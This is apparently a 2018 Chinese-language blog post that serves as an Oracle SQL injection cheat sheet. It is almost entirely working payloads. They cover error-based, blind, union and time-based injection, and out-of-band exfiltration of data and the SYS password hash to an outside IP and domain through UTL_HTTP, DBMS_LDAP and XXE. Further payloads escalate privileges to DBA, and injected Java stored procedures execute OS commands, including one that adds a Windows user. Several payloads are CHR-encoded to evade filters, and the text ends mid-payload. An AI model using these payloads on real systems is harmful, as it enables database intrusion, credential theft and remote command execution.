---
layout: post
title: hacking-oracle
date: 2018-06-19 
tag: sql-injection
---
0x0 前言 
0x1 信息探测 
0x2 命令执行 
0x3 实战
### 0x0 前言
---
&emsp;&emsp;在乙方做渗透测试的时候，经常会遇到oracle数据库的注入，这里是针对oracle数据库进行sql注入一系列总结，其中绝大大多数知识都是跟着各位大哥或者前辈学来，感谢他们的分享。   
测试数据库如下：    
ORACLE DATABASE 10G ENTERPRISE EDITION RELEASE 10.2.0.1.0   
Oracle Database 11g Express Edition Release 11.2.0.2.0.  
Oracle Database 11g Enterprise Edition Release 11.2.0.1.0 - 64bit  
Oracle Database 10g Enterprise Edition Release 10.2.0.3.0    
以下所说的10g默认为10.2.0.3.0 11g默认为11.2.0.1.0   
### 0x1 信息探测
* SQL

```
select user from dual #当前用户
SELECT banner FROM v$version WHERE banner LIKE 'Oracle%';   #oracle版本
select wmsys.wm_concat(granted_role) from user_role_privs-- 看赋予角色权限
select instance_name from v$instance#服务器sid 远程链接需要
select utl_inaddr.get_host_name('127.0.0.1') from dual; #查询内网hostname win08dc.contoso.com
SELECT UTL_HTTP.REQUEST('http://localhost') FROM dual;  #对外通信
SELECT UTL_INADDR.get_host_address('localhost.com') FROM dual;
select table_name from user_tables where lower(table_name)='books'   #查看books表书否存在
```
* Error Based(报错注入)

```
(10g or 11g)
' and 1 = ctxsys.drithsx.sn(1,(select user from dual))--  
and 1=(dbms_utility.sqlid_to_sqlhash((select banner from sys.v_$version where rownum=1))) and 1=1. 
' and 1=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(122)||CHR(120)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (4113=4113) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(118)||CHR(107)||CHR(107)||CHR(113)||CHR(62))) FROM DUAL)--  
' and dbms_xdb_version.checkin((select user from dual))='1'--  
' and dbms_xdb_version.makeversioned((select user from dual))='1'--  
' and dbms_utility.sqlid_to_sqlhash((select user from dual))='1'--  
' and dbms_utility.sqlid_to_sqlhash((select user from dual))='1'--  
' and 1=(select decode(substr(user,1,1),'S',(1/0),0) from dual)--     #user第一位是S ORA-01476: divisor is equal to zero 
' order by (SELECT (CASE WHEN (2434=2434||utl_inaddr.get_host_name((select banner from v$version where rownum=1))) THEN 2434 ELSE CAST(1 AS INT)/0 END) FROM DUAL)--%'  

11g普通用户不能用的#utl_inaddr not work maybe acl(11g normal user) or java not installed etc
'||utl_inaddr.get_host_address((select banner from v$version where rownum=1))||'    
'||utl_inaddr.get_host_name((select banner from v$version where rownum=1))||'

10g不能用的
' and dbms_aw_xml.readawmetadata((select sys_context('USERENV', 'SESSION_USER') from dual), null) is null --    #(11g 10g报错ORA-29532: Java call terminated by uncaught Java exception: java.lang.OutOfMemoryError)
' or dbMS_aW_xMl.reAdaWmetaData((select sYS_cONtExt('US' || 'ERENV', 'SESS' || 'ION_US' || 'ER') from dUAl), null) is null --# bypass 1
' and 1=(ordsys.ord_dicom.getmappingxpath((select user from dual),user,user))-- 
```
* Boolean-based blind(boolean型盲注)

```
' and  1=(1) and substr(user,0,1)='Z
' and length(user)=6-- length('a')=1-- length(1111)=4
name=admin adm'||case when 1=2 then NULL else 1 end||'in(搜索框也可用)
'||case when length(sys.database_name)=8 then NULL else 1 end||'
a%' order by (case when 1=2 then name else 'somthing' end)--    #表达式为真根据id排序为假根据something
排序不同
```
* Union(联合查询)

```
' and 1=2 union select NULL,NULL,NULL--
```
* Time(时间盲注)

```
 order by (case when(1=1) then dbms_pipe.receive_message('ku', 10) else 1 end)
 ' and 1 = case when substr(user, 1, 1) = 'S' then dbms_pipe.receive_message('ku', 10) else 1 end --
 ' and 1=DBMS_PIPE.RECEIVE_MESSAGE(CHR(117)||CHR(121)||CHR(68)||CHR(74),5)
 ?id=(SELECT CASE WHEN (NVL(ASCII(SUBSTR(({INJECTION}),1,1)),0) = 100) THEN dbms_pipe.receive_message(('xyz'),14) ELSE dbms_pipe.receive_message(('xyz'),1) END FROM dual)
```
* stack query(堆叠查询)

```
oralce不支持堆叠查询，除非你找到能利用PL/SQL的相关函数。#No stacked queries Cannot add ; do something nasty Unless you get really lucky to be injected into PL/SQL*
```
* Out of Band(OOB)

```
#both 10 and 11g（window无限制）
select DBMS_LDAP.INIT((select user from dual)||'.fzrsuf.3w1.pw',80) from dual 
SELECT DBMS_LDAP.INIT((SELECT password FROM SYS.USER$ WHERE name='SYS')||'.fzrsuf.3w1.pw',80) FROM dual     #获取sys密码

#both 10 and 11g（oracle 11g普通用户有限制)
SELECT UTL_HTTP.REQUEST('http://74.121.151.89') FROM DUAL;  #get the first 2000 bytes of data 
select utl_inaddr.get_host_address((select 1234567811 from dual)||'.fzrsuf.3w1.pw') from dual

#all users,8-10g R2
select httpuritype( 'http://74.121.151.89/123344/back.pl').getclob() from dual; 

#both 10 and 11g（oracle 11g普通用户有限制) 
(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % nakut SYSTEM "http://'||(select CHR(51)||CHR(54)||CHR(48) from dual)||'.fzrsuf.3w1.pw/">%nakut;]>'),'/l') from dual)    
(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://74.121.151.89:8888/'||(SELECT user from dual)||'"> %remote;]>'),'/l') from dual)
(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://74.121.151.89:8888/'||(select listagg(id||chr(58)||name,',') within group (order by id) from users where rownum<5)||'"> %remote; %param1;]>'),'/l') from dual)    #GET /admin:1,safe:2,test:3 获取前三列 (10g获取报错了)

web下利用
'||UTL_HTTP.REQUEST('http://74.121.151.89:8888')||'
'||utl_inaddr.get_host_address((select 1234567811 from dual)||'.fzrsuf.3w1.pw')||'
'||DBMS_LDAP.INIT((select user from dual)||'.fzrsuf.3w1.pw',80))||'

' and utl_inaddr.get_host_address((select 1234567811 from dual)||'.fzrsuf.3w1.pw')=1--
' and utl_inaddr.get_host_address((select 3333333 from dual)||'.fzrsuf.3w1.pw') like 1--
' and UTL_HTTP.REQUEST('http://74.121.151.89:8888')='1'--
' and DBMS_LDAP.INIT((select user from dual)||'.fzrsuf.3w1.pw',80) is not null--    #后面要加is not null

' and (select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://74.121.151.89:8888/'||(SELECT user from dual)||'"> %remote;]>'),'/l') from dual)||'
' and 1=(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://74.121.151.89:8888/'||(SELECT user from dual)||'"> %remote;]>'),'/l') from dual) or '1'='1
' AND 1=(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://74.121.151.89:8888/'||(select listagg(id||chr(58)||name,',') within group (order by id) from users where rownum<5)||'"> %remote; %param1;]>'),'/l') from dual)--    #可能会报错 但还是会执行 尽量用一些53 80的端口
' AND 1=(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://74.121.151.89:8888/'||(select listagg(id||chr(58)||name,',') within group (order by id) from users where rownum<5)||'"> %remote; %param1;]>'),'/l') from dual)--
```
* 手工注入

```
#查询框注入示例(Boolean)
name=a%' and (select count(*) from users)<>0 and '%'='   #不等于为<> 返回一样证明users表存在
name=a%' and (select count(*) from users)<>3 and '%'='  #返回不一样证明users表行数为3
select count(id) from users   #证明id字段存在
select count(name) from users   #证明name字段存在
name=a%' and  (select length(name) from users where id=1)<>5 and '%'='  #返回不一致证明id为1的列name数据长度为5 去掉id=1信息跑其中第一个name长度为5的数据
name=a%' and  ((select count(*) from users where id=1 and ascii(substr(name,1,1))=97))<>0 and '%'='   #有返回证明第一位字符为a
name=a%' and  ((select count(*) from users where id=1 and ascii(substr(name,2,1))=100))<>0 and '%'='  #第二位字符为d
name=a%' and  (select count(*) from users where ascii(substr(name,1.1))>=97)=1 and '%'='    #只有一个用户
name=a%' and  (select count(*) from users where length(name)=4 and ascii(substr(name,1,1))=115 and ascii(substr(name,2,1))=97)<>0 and '%'='  #不加id如果数据多略微麻烦一点    #多用户跑name为safe 前俩位 不多详解

#报错注入(Error Based)
select * from user_tab_columns where column_name like '%name%'    #user_table_columns=user_tab_cols
table_name  column_name data_type
users   name    VARCHAR2
test    name    VARCHAR2
select count(*) from user_tab_columns where column_name like '%name%'   #查询字段中有password到表名 返回行数
select chr(35)||data||chr(39) from (select rownum as limit,table_name||chr(35)||column_name as data from user_tab_columns where column_name like '%name%') where limit =2    #查看第二条含有列名%name%的表明列名
name=a%' and  1=(utl_inaddr.get_host_address(((select chr(35)||data||chr(39) from (select rownum as limit,table_name||chr(35)||column_name as data from user_tab_columns where column_name like '%name%') where limit =2)))) and '%'='  #通过报错提取第二行数据
Warning: oci_execute(): ORA-29257: host #users##name' unknown ORA-06512:  #表明users 列名name
select chr(126)||chr(39)||data||chr(39)||chr(126) from (selEct rownum as limit,column_name as data from user_tab_columns whEre table_name=CHR(117) || CHR(115) || CHR(101) || CHR(114) || CHR(115)) whEre limit =1    #获取该表第一个列名 CHR(117) || CHR(115) || CHR(101) || CHR(114) || CHR(115))为users编码所得
name=a%' and  1=(utl_inaddr.get_host_address(((select chr(126)||chr(39)||data||chr(39)||chr(126) from (selEct rownum as limit,column_name as data from user_tab_columns whEre table_name=CHR(117) || CHR(115) || CHR(101) || CHR(114) || CHR(115)) whEre limit =1))))  and '%'='
Warning: oci_execute(): ORA-29257: host ~'id'~ 
name=a%' and  1=(utl_inaddr.get_host_address(((select chr(126)||chr(39)||data||chr(39)||chr(126) from (selEct rownum as limit,column_name as data from user_tab_columns whEre table_name=CHR(117) || CHR(115) || CHR(101) || CHR(114) || CHR(115)) whEre limit =2))))  and '%'='
Warning: oci_execute(): ORA-29257: host ~'name'~ 
name=a%' and  1=(utl_inaddr.get_host_address((Select chr(126)||chr(39)||data||chr(39)||chr(126) from (selEct rownum as limit,id||chr(35)||NAME as data from users) where limit=1)))  and '%'='
Warning: oci_execute(): ORA-29257: host ~'1#admin'~ unknown

'||utl_inaddr.get_host_name((SELECT table_name FROM USER_TAB_COLS WHERE COLUMN_NAME LIKE '%25%32%35F_YHKL%25%32%35' and table_name not like '%25%32%35%25%34%32%25%34%39%25%34%65%25%32%35' and table_name not in ('TBZYDA') and table_name not in('TBCZJZYDA') AND ROWNUM=1))||'   #oracle(还是jsp 忘了)好像可以对url编码自动解码 测试超过三次失败

#批量提取
'||utl_inaddr.get_host_address((select listagg(id||chr(58)||name,',') within group (order by id) from users where rownum<5))||' #listagg 11g以上提取数据
select wmsys.wm_concat(id||chr(58)||name) from user     #通用
```
* 调试信息(本文用到的)

```
select * from user_java_policy where grantee_name='SYSTEM'; 查看SYSTEM可用的java权限列表，通过以下命令查看赋权情况 #ORACLE不要用双引号 双引号会被当成字符处理 所以一般用成对的引号 '' '''' ''''''''
select * from user_objects where OBJECT_NAME='javaexec' #检测包是否创建成功
select * from user_objects where OBJECT_NAME='JAVACMD'  #检测函数是否存在 函数要么与原先一致要么大写 
select wmsys.wm_concat(granted_role) from user_role_privs-- 看赋予角色权限
select text from all_source where name = 'DBMS_EXPORT_EXTENSION' 查询包的源码
SELECT * FROM ALL_OBJECTS WHERE OBJECT_TYPE IN ('FUNCTION','PROCEDURE','PACKAGE') order by object_id desc; 查询已安装的函数
删除对应的某个权限 如去除java.io.FilePermission
begin
  DBMS_JAVA.DISABLE_PERMISSION(129);
  dbms_java.delete_permission(129); 
  commit;
end;
删除相关的包类或者函数  #Use the DROP JAVA statement to drop a Java source, class, or resource schema object.
revoke JAVASYSPRIV from SYSTEM;
drop JAVA SOURCE "javaexec";
drop FUNCTION SYSTEM.javacmd;
drop FUNCTION SYSTEM.myjava;
drop FUNCTION SYSTEM.myjava1;
drop FUNCTION SYSTEM.myjava2;
list all Java related stored objects class
SELECT object_name,object_type,status,timestamp FROM user_objects WHERE (object_name NOT LIKE 'SYS_%' AND object_name NOT LIKE 'CREATE$%' AND object_name NOT LIKE 'JAVA$%' AND object_name NOT LIKE 'LOADLOB%') AND object_type LIKE 'JAVA %' ORDER BY object_type, object_name;
'1'=utl_inaddr.get_host_name((select count(*) from user_objects where OBJECT_NAME='SasugaOracle'))--    #使用web调试
sqlplus /nolog  #登陆本机
```
### 0x2 命令执行
能提dba就提dba 然后grant javasyspriv权限 创建class 创建javacmd 执行命令不能提dba dbms_xmlquery.newcontext赋予其fileio执行权限(10g额外需要write read)   
* 提权到dba的几个函数（我就GET_DOMAIN_INDEX_TABLES成功过）

```
#创建提权函数
and (select dbms_xmlquery.newcontext('declare PRAGMA AUTONOMOUS_TRANSACTION; begin execute immediate ''create or replace function pwn return varchar2 authid current_user is PRAGMA autonomous_transaction;BEGIN execute immediate ''''grant dba to TEST'''';commit;return ''''z'''';END; ''; commit; end;') from dual) is not null --

使用SYS.LT.CREATEWORKSPACE提权 9iR2, 10gR1, 10gR2 and 11gR1     #fixed 2009.7
and (select dbms_xmlquery.newcontext('declare PRAGMA AUTONOMOUS_TRANSACTION; begin execute immediate ''
begin SYS.LT.CREATEWORKSPACE(''''A10'''''''' and TEST.pwn()=''''''''x'''');SYS.LT.REMOVEWORKSPA CE(''''A10'''''''' and TEST.pwn()=''''''''x'''');end;''; commit; end;') from dual) is not null --#本地失败

使用sys.dbms_cdc_publish.create_change_set提权 10gR1, 10gR2, 11g R1 and 11gR2   #fixed 2010.10
select dbms_xmlquery.newcontext('declare PRAGMA AUTONOMOUS_TRANSACTION; begin execute immediate '' begin sys.dbms_cdc_publish.create_change_set('''' a'''',''''a'''',''''a''''''''||TEST.pwn()||''''''''a'''',''''Y'''',s ysdate,sysdate);end;''; commit; end;') from dual--#本地失败

使用GET_DOMAIN_INDEX_TABLES Oracle 8.1.7.4, 9.2.0.1 - 9.2.0.7, 10.1.0.2 - 10.1.0.4, 10.2.0.1-10.2.0.2
' and (select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('foo','bar','DBMS_OUTPUT".PUT_LINE(:P1); EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION; BEGIN EXECUTE IMMEDIATE ''''grant dba to TEST''''; END;''; END;--', '', 0, '1', 0) from dual)=0--#注 10.2.0.1测试成功
```
* 11g dba权限下直接执行命令    #测试数据库

```
PL/SQL如下:
begin
DBMS_SCHEDULER.create_program('myprog11','EXECUTABLE','net user pwned pwn3d!! /add',0,TRUE);
DBMS_SCHEDULER.create_job(job_name=>'myjob11',program_name=>'myprog11',
start_date=>NULL,repeat_interval=>NULL,end_date=>NULL,enabled=>TRUE,auto_drop=>TRUE);
dbms_lock.sleep(1);
dbms_scheduler.drop_program(program_name=>'myprog11');
dbms_scheduler.purge_log;
end;
#sql injection如下：
' and (select SYS.KUPP$PROC.CREATE_MASTER_PROCESS('DBMS_SCHEDULER.create_program(''myprog10'',''EXECUTABLE'',''net user pwnedfromweb pwn3d!! /add'',0,TRUE);DBMS_SCHEDULER.create_job(job_name=>''myjob10'',program_name=>''myprog10'',start_date=>NULL,repeat_interval=>NULL,end_date=>NULL,enabled=>TRUE,auto_drop=>TRUE);dbms_lock.sleep(1);dbms_scheduler.drop_program(program_name=>''myprog10'');dbms_scheduler.purge_log;')from dual) is not null --
Oracle Database 11g Express Edition Release 11.2.0.2.0 – Production #测试失败
Oracle Database 11g Enterprise Edition Release 11.2.0.1.0 - 64bit Production    #测试失败

参考文章
https://www.notsosecure.com/hacking-oracle-xe-from-web/
```
* dba下赋予相关权限

```
#only be executed by SYS.Affected Systems:8,9,10g R1,R2,11gR1
(Select DBMS_REPCAT_RPC.VALIDATE_REMOTE_RC(USER,'VALIDATE_GRP_OBJECTS_LOCAL(:canon_gname); execute immediate ''declare pragma autonomous_transaction;begin execute immediate ''''grant dba to aaaa'''';end;''; end;--','CCCC') from dual) is not null-- 
(select DBMS_REPCAT_RPC.VALIDATE_REMOTE_RC(CHR(85)||CHR(83)||CHR(69)||CHR(82)||CHR(44)||CHR(86)||CHR(65)||CHR(76)||CHR(73)||CHR(68)||CHR(65)||CHR(84)||CHR(69)||CHR(95)||CHR(71)||CHR(82)||CHR(80)||CHR(95)||CHR(79)||CHR(66)||CHR(74)||CHR(69)||CHR(67)||CHR(84)||CHR(83)||CHR(95)||CHR(76)||CHR(79)||CHR(67)||CHR(65)||CHR(76)||CHR(40)||CHR(58)||CHR(99)||CHR(97)||CHR(110)||CHR(111)||CHR(110)||CHR(95)||CHR(103)||CHR(110)||CHR(97)||CHR(109)||CHR(101)||CHR(41)||CHR(59)||CHR(32)||CHR(101)||CHR(120)||CHR(101)||CHR(99)||CHR(117)||CHR(116)||CHR(101)||CHR(32)||CHR(105)||CHR(109)||CHR(109)||CHR(101)||CHR(100)||CHR(105)||CHR(97)||CHR(116)||CHR(101)||CHR(32)||CHR(39)||CHR(100)||CHR(101)||CHR(99)||CHR(108)||CHR(97)||CHR(114)||CHR(101)||CHR(32)||CHR(112)||CHR(114)||CHR(97)||CHR(103)||CHR(109)||CHR(97)||CHR(32)||CHR(97)||CHR(117)||CHR(116)||CHR(111)||CHR(110)||CHR(111)||CHR(109)||CHR(111)||CHR(117)||CHR(115)||CHR(95)||CHR(116)||CHR(114)||CHR(97)||CHR(110)||CHR(115)||CHR(97)||CHR(99)||CHR(116)||CHR(105)||CHR(111)||CHR(110)||CHR(59)||CHR(98)||CHR(101)||CHR(103)||CHR(105)||CHR(110)||CHR(32)||CHR(101)||CHR(120)||CHR(101)||CHR(99)||CHR(117)||CHR(116)||CHR(101)||CHR(32)||CHR(105)||CHR(109)||CHR(109)||CHR(101)||CHR(100)||CHR(105)||CHR(97)||CHR(116)||CHR(101)||CHR(32)||CHR(39)||CHR(39)||CHR(103)||CHR(114)||CHR(97)||CHR(110)||CHR(116)||CHR(32)||CHR(100)||CHR(98)||CHR(97)||CHR(32)||CHR(116)||CHR(111)||CHR(32)||CHR(97)||CHR(97)||CHR(97)||CHR(97)||CHR(39)||CHR(39)||CHR(59)||CHR(101)||CHR(110)||CHR(100)||CHR(59)||CHR(39)||CHR(59)||CHR(32)||CHR(101)||CHR(110)||CHR(100)||CHR(59)||CHR(45)||CHR(45)||CHR(44)||CHR(67)||CHR(67)||CHR(67)||CHR(67))from dual) is not null--

Only DBA can call this function
(select SYS.KUPP$PROC.CREATE_MASTER_PROCESS(begin execute immediate 'grant javasyspriv to SYSTEM';end;)from dual) is not null   
' AND (select SYS.KUPP$PROC.CREATE_MASTER_PROCESS(CHR(98)||CHR(101)||CHR(103)||CHR(105)||CHR(110)||CHR(32)||CHR(101)||CHR(120)||CHR(101)||CHR(99)||CHR(117)||CHR(116)||CHR(101)||CHR(32)||CHR(105)||CHR(109)||CHR(109)||CHR(101)||CHR(100)||CHR(105)||CHR(97)||CHR(116)||CHR(101)||CHR(32)||CHR(39)||CHR(103)||CHR(114)||CHR(97)||CHR(110)||CHR(116)||CHR(32)||CHR(106)||CHR(97)||CHR(118)||CHR(97)||CHR(115)||CHR(121)||CHR(115)||CHR(112)||CHR(114)||CHR(105)||CHR(118)||CHR(32)||CHR(116)||CHR(111)||CHR(32)||CHR(83)||CHR(89)||CHR(83)||CHR(84)||CHR(69)||CHR(77)||CHR(39)||CHR(59)||CHR(101)||CHR(110)||CHR(100)||CHR(59))from dual) is not null-- 

参考文章
http://www.nocoug.org/download/2013-02/NoCOUG_201302_Slavik_Markovich_SQL_Injection_in_Web_Applications.pdf
https://media.blackhat.com/bh-us-10/whitepapers/Siddharth/BlackHat-USA-2010-Siddharth-Hacking-Oracle-from-the-Web-wp.pdf
```
* 命令执行

```
1. hacking 10g  Oracle 8.1.7.4, 9.2.0.1 - 9.2.0.7, 10.1.0.2 - 10.1.0.4, 10.2.0.1-10.2.0.2
ORACLE DATABASE 10G ENTERPRISE EDITION RELEASE 10.2.0.1.0（该版本虚拟机丢失 之前测试成功)
1. 提升TEST用户到dba权限    TEST用户名要大写
' and (select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('foo','bar','DBMS_OUTPUT".PUT_LINE(:P1); EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION; BEGIN EXECUTE IMMEDIATE ''''grant dba to TEST''''; END;''; END;--', '', 0, '1', 0) from dual)=0--
2. 创建Java包
' and (select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('foo','bar','DBMS_OUTPUT".PUT_LINE(:P1); EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION; BEGIN EXECUTE IMMEDIATE ''''create or replace and compile java source named "SasugaOracle" as import java.lang.*;import java.io.*;class SasugaOracle{public static String exec(String cmd){String ret="",tmp;try{BufferedReader reader=new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(cmd).getInputStream()));while ((tmp=reader.readLine())!=null){ret+=tmp;}reader.close();}catch(Exception ex){ret=ex.toString();}return ret;}}''''; END;''; END;--', '', 0, '1', 0) from dual)=0--
3. 赋予Java权限
' and (select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''begin dbms_java.grant_permission(''''''''PUBLIC'''''''', ''''''''SYS:java.io.FilePermission'''''''',''''''''<>'''''''',''''''''execute''''''''); end;'''';END;'';END;--','SYS',0,'1',0) from dual)=0--
创建runcmd函数
' and (select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''create or replace function runcmd(cmd in varchar2) return varchar2 as language java name ''''''''SasugaOracle.exec(java.lang.String) return java.lang.String'''''''';'''';END;'';END;--','SYS',0,'1',0) from dual)=0--
4. 赋予所有人执行权限
' and (select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''grant execute on runcmd to public'''';END;'';END;--','SYS',0,'1',0) from dual)=0--
5.命令执行
' and 1=2 union select 1,sys.runcmd('cmd /c ver'),2 from dual--

2. hacking Oracle Database 11.1.0.7.0 以及更低版本(The 11.2.0.1 April CPU patch fixes this)
当前用户有dba权限
1. #赋予SYSTEM Javasyspriv Only DBA can call this function
(select SYS.KUPP$PROC.CREATE_MASTER_PROCESS(begin execute immediate 'grant javasyspriv to SYSTEM';end;)from dual) is not null   
' AND (select SYS.KUPP$PROC.CREATE_MASTER_PROCESS(CHR(98)||CHR(101)||CHR(103)||CHR(105)||CHR(110)||CHR(32)||CHR(101)||CHR(120)||CHR(101)||CHR(99)||CHR(117)||CHR(116)||CHR(101)||CHR(32)||CHR(105)||CHR(109)||CHR(109)||CHR(101)||CHR(100)||CHR(105)||CHR(97)||CHR(116)||CHR(101)||CHR(32)||CHR(39)||CHR(103)||CHR(114)||CHR(97)||CHR(110)||CHR(116)||CHR(32)||CHR(106)||CHR(97)||CHR(118)||CHR(97)||CHR(115)||CHR(121)||CHR(115)||CHR(112)||CHR(114)||CHR(105)||CHR(118)||CHR(32)||CHR(116)||CHR(111)||CHR(32)||CHR(83)||CHR(89)||CHR(83)||CHR(84)||CHR(69)||CHR(77)||CHR(39)||CHR(59)||CHR(101)||CHR(110)||CHR(100)||CHR(59))from dual) is not null-- 
2. 创建javaexec包
' and (select dbms_xmlquery.newcontext('declare PRAGMA AUTONOMOUS_TRANSACTION; begin execute immediate ''create or replace and resolve java source named "javaexec" as import java.lang.*;import java.io.*;public class javaexec{public static String Ecmd(String ss) throws IOException{BufferedReader mR= new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(ss).getInputStream()));String st,str="";while ((st=mR.readLine()) != null) str += st+"\n";mR.close();return str;}}'';commit; end;') from dual) where rownum=1--
' and (select dbms_xmlquery.newcontext(CHR(100)||CHR(101)||CHR(99)||CHR(108)||CHR(97)||CHR(114)||CHR(101)||CHR(32)||CHR(80)||CHR(82)||CHR(65)||CHR(71)||CHR(77)||CHR(65)||CHR(32)||CHR(65)||CHR(85)||CHR(84)||CHR(79)||CHR(78)||CHR(79)||CHR(77)||CHR(79)||CHR(85)||CHR(83)||CHR(95)||CHR(84)||CHR(82)||CHR(65)||CHR(78)||CHR(83)||CHR(65)||CHR(67)||CHR(84)||CHR(73)||CHR(79)||CHR(78)||CHR(59)||CHR(32)||CHR(98)||CHR(101)||CHR(103)||CHR(105)||CHR(110)||CHR(32)||CHR(101)||CHR(120)||CHR(101)||CHR(99)||CHR(117)||CHR(116)||CHR(101)||CHR(32)||CHR(105)||CHR(109)||CHR(109)||CHR(101)||CHR(100)||CHR(105)||CHR(97)||CHR(116)||CHR(101)||CHR(32)||CHR(39)||CHR(99)||CHR(114)||CHR(101)||CHR(97)||CHR(116)||CHR(101)||CHR(32)||CHR(111)||CHR(114)||CHR(32)||CHR(114)||CHR(101)||CHR(112)||CHR(108)||CHR(97)||CHR(99)||CHR(101)||CHR(32)||CHR(97)||CHR(110)||CHR(100)||CHR(32)||CHR(114)||CHR(101)||CHR(115)||CHR(111)||CHR(108)||CHR(118)||CHR(101)||CHR(32)||CHR(106)||CHR(97)||CHR(118)||CHR(97)||CHR(32)||CHR(115)||CHR(111)||CHR(117)||CHR(114)||CHR(99)||CHR(101)||CHR(32)||CHR(110)||CHR(97)||CHR(109)||CHR(101)||CHR(100)||CHR(32)||CHR(34)||CHR(106)||CHR(97)||CHR(118)||CHR(97)||CHR(101)||CHR(120)||CHR(101)||CHR(99)||CHR(34)||CHR(32)||CHR(97)||CHR(115)||CHR(32)||CHR(105)||CHR(109)||CHR(112)||CHR(111)||CHR(114)||CHR(116)||CHR(32)||CHR(106)||CHR(97)||CHR(118)||CHR(97)||CHR(46)||CHR(108)||CHR(97)||CHR(110)||CHR(103)||CHR(46)||CHR(42)||CHR(59)||CHR(105)||CHR(109)||CHR(112)||CHR(111)||CHR(114)||CHR(116)||CHR(32)||CHR(106)||CHR(97)||CHR(118)||CHR(97)||CHR(46)||CHR(105)||CHR(111)||CHR(46)||CHR(42)||CHR(59)||CHR(112)||CHR(117)||CHR(98)||CHR(108)||CHR(105)||CHR(99)||CHR(32)||CHR(99)||CHR(108)||CHR(97)||CHR(115)||CHR(115)||CHR(32)||CHR(106)||CHR(97)||CHR(118)||CHR(97)||CHR(101)||CHR(120)||CHR(101)||CHR(99)||CHR(123)||CHR(112)||CHR(117)||CHR(98)||CHR(108)||CHR(105)||CHR(99)||CHR(32)||CHR(115)||CHR(116)||CHR(97)||CHR(116)||CHR(105)||CHR(99)||CHR(32)||CHR(83)||CHR(116)||CHR(114)||CHR(105)||CHR(110)||CHR(103)||CHR(32)||CHR(69)||CHR(99)||CHR(109)||CHR(100)||CHR(40)||CHR(83)||CHR(116)||CHR(114)||CHR(105)||CHR(110)||CHR(103)||CHR(32)||CHR(115)||CHR(115)||CHR(41)||CHR(32)||CHR(116)||CHR(104)||CHR(114)||CHR(111)||CHR(119)||CHR(115)||CHR(32)||CHR(73)||CHR(79)||CHR(69)||CHR(120)||CHR(99)||CHR(101)||CHR(112)||CHR(116)||CHR(105)||CHR(111)||CHR(110)||CHR(123)||CHR(66)||CHR(117)||CHR(102)||CHR(102)||CHR(101)||CHR(114)||CHR(101)||CHR(100)||CHR(82)||CHR(101)||CHR(97)||CHR(100)||CHR(101)||CHR(114)||CHR(32)||CHR(109)||CHR(82)||CHR(61)||CHR(32)||CHR(110)||CHR(101)||CHR(119)||CHR(32)||CHR(66)||CHR(117)||CHR(102)||CHR(102)||CHR(101)||CHR(114)||CHR(101)||CHR(100)||CHR(82)||CHR(101)||CHR(97)||CHR(100)||CHR(101)||CHR(114)||CHR(40)||CHR(110)||CHR(101)||CHR(119)||CHR(32)||CHR(73)||CHR(110)||CHR(112)||CHR(117)||CHR(116)||CHR(83)||CHR(116)||CHR(114)||CHR(101)||CHR(97)||CHR(109)||CHR(82)||CHR(101)||CHR(97)||CHR(100)||CHR(101)||CHR(114)||CHR(40)||CHR(82)||CHR(117)||CHR(110)||CHR(116)||CHR(105)||CHR(109)||CHR(101)||CHR(46)||CHR(103)||CHR(101)||CHR(116)||CHR(82)||CHR(117)||CHR(110)||CHR(116)||CHR(105)||CHR(109)||CHR(101)||CHR(40)||CHR(41)||CHR(46)||CHR(101)||CHR(120)||CHR(101)||CHR(99)||CHR(40)||CHR(115)||CHR(115)||CHR(41)||CHR(46)||CHR(103)||CHR(101)||CHR(116)||CHR(73)||CHR(110)||CHR(112)||CHR(117)||CHR(116)||CHR(83)||CHR(116)||CHR(114)||CHR(101)||CHR(97)||CHR(109)||CHR(40)||CHR(41)||CHR(41)||CHR(41)||CHR(59)||CHR(83)||CHR(116)||CHR(114)||CHR(105)||CHR(110)||CHR(103)||CHR(32)||CHR(115)||CHR(116)||CHR(44)||CHR(115)||CHR(116)||CHR(114)||CHR(61)||CHR(34)||CHR(34)||CHR(59)||CHR(119)||CHR(104)||CHR(105)||CHR(108)||CHR(101)||CHR(32)||CHR(40)||CHR(40)||CHR(115)||CHR(116)||CHR(61)||CHR(109)||CHR(82)||CHR(46)||CHR(1